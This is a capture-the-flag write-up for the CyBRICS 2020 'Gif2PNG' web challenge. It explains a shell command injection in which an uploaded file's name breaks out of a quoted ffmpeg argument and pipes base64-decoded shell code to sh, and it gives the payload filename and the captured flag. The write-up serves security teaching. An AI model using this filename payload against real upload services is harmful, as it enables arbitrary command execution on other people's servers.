# Gif2PNG (web, 52p, 118 solved)

In the task we get access to a page where we can upload GIF images and it turns them into PNGs.
We have the [source code](main.py) so we can analyse how this conversion happens (relevant part):

```python
    if not bool(re.match("^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$", file.filename)) or ".." in file.filename:
        logging.debug(f'Invalid symbols in filename: {file.content_type}')
        flash('Invalid filename', 'danger')
        return redirect(request.url)

    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))

        mime_type = filetype.guess_mime(f'uploads/{file.filename}')
        if mime_type != "image/gif":
            logging.debug(f'Invalid Mime type: {mime_type}')
            flash('Mime type is not "image/gif"', 'danger')
            return redirect(request.url)

        uid = str(uuid.uuid4())
        os.mkdir(f"uploads/{uid}")

        logging.debug(f"Created: {uid}. Command: ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"")

        command = subprocess.Popen(f"ffmpeg -i 'uploads/{file.filename}' \"uploads/{uid}/%03d.png\"", shell=True)
        command.wait(timeout=15)
        logging.debug(command.stdout)

        flash('Successfully saved', 'success')
        return redirect(url_for('result', uid=uid))

return render_template("form.html")
```

So we have certain whitelist for filename characters, and then there is `ffmpeg` conversion.
The vulnerability is here:

```python
filename = secure_filename(file.filename)
file.save(os.path.join(app.config['UPLOAD_FOLDER'], file.filename))
```

Notice that this `secured` filename is `never used` at all!
The app is actually using the original name we provided!
And in the whitelist we can see `'` and `|`.

Since the command running in shell (with `shell=True`) is `ffmpeg -i 'uploads/{file.filename}'` then we can provide a name with `'` to escape and then `|` to chain commands with a classic `command injection` vector.

Out payload filename is:

```
test.gif' | (echo '"+payload+"' | base64 -d | sh) | '.gif
```

We can submit any base64 encoded shell payload to execute this way.

The simplest way to exfiltrate the `main.py` with the flag inside is to simply copy it to some location we can access.
Fortunately in this service we can access converted PNG files if we know the random UUID directory name and filename.

We create an entry by uploading some file, and then run: `payload = base64.b64encode('cp main.py uploads/4a8f46fe-ba07-4ccd-98dd-53a919a87899')`

And from `http://gif2png-cybrics2020.ctf.su/uploads/4a8f46fe-ba07-4ccd-98dd-53a919a87899/main.py` we can recover the flag: `cybrics{imagesaresocoolicandrawonthem}`
